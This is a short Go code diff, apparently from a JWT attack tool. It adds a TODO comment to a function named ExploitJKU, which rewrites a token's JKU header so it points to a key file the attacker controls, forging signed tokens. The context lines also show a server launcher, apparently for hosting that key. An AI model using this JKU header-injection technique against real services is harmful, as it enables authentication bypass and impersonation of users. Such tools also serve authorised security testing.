@@ -27,6 +27,7 @@ func LaunchServer(port int) {
 func ExploitJKU(token *jwt.Token, userHeader string, userValue string) string {
 
 	//Change the value of the "JKU" header to set the path to our file containing our private key
+	//Todo : Change file according to the algo used
 	newToken, err := ctrl.ChangeValue(token, "JKU", pathToJWKFile, true)
 	if err != nil {
 		fmt.Printf("An error ocurred while modifying the value of \"JWK\" header : %s \n", err)
